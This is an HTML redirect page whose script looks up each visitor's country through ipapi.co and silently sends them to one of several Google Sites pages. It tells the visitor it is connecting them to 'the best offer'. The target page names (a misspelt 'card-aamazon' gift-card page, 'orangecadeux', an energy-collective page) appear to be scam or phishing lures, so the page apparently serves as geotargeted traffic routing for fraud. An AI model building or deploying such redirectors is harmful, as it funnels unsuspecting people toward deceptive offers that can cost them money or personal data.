<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 20px;
        }
        .loading {
            font-size: 18px;
            color: #555;
        }
    </style>
    <script>
        document.addEventListener("DOMContentLoaded", async () => {
            const fallbackUrl = "https://sites.google.com/view/orangecadeux/home"; // Update fallback if needed
            
            try {
                // Fetch user geolocation data
                const response = await fetch("https://ipapi.co/json/");
                if (!response.ok) throw new Error("API Error");
                
                const data = await response.json();
                const countryCode = data.country_code;

                // Map countries to landing pages
                const landingPages = {
                    US: "https://sites.google.com/view/card-aamazon/home",
                    UK: "https://sites.google.com/view/dontmissi/home",
                    FR: "https://sites.google.com/view/orangecadeux/home",
                    IT: "https://sites.google.com/view/scottishwindowsdoorsfunding/home",
                    NL: "https://sites.google.com/view/nationaalenergiecollectief/home",
                };

                // Redirect user
                window.location.href = landingPages[countryCode] || fallbackUrl;
            } catch (error) {
                console.error("Geolocation error:", error);
                window.location.href = fallbackUrl; // Redirect to fallback
            }
        });
    </script>
</head>
<body>
    <h1>Redirecting...</h1>
    <p class="loading">Please wait while we connect you to the best offer...</p>
</body>
</html>
